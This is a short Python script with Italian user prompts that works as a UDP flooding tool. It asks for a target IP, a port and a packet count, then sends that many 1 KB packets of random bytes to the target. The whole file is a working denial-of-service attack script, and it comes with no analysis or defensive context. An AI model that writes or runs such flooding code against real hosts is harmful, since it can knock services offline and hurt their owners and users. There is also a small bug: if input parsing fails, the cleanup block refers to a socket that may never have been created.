import socket
import random

def UDP_flood():
    try:
        ip_target = input("inserisci l'IP del target: ")  
        porta_target = int(input("inserisci la porta dove indirizzare i pacchetti: "))
        num_pacchetti = int(input("inserisci il numero di pacchetti: "))

        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
        print(f"invio di {num_pacchetti} pacchetti da 1 KB a {ip_target} su porta {porta_target}")

        for i in range(num_pacchetti):
            pacchetto = bytes(random.getrandbits(8) for _ in range(1024))
            udp_socket.sendto(pacchetto, (ip_target, porta_target))
            print(f"pacchetto {i+1} inviato")
        print("invio effettuato")
    except ValueError:
        print("IP o porta non validi")
    except socket.error as e:
        print("Errore di porta:", e)
    except KeyboardInterrupt:
        print("Programma terminato dall'utente")
    finally:
        if udp_socket:
            udp_socket.close()


UDP_flood()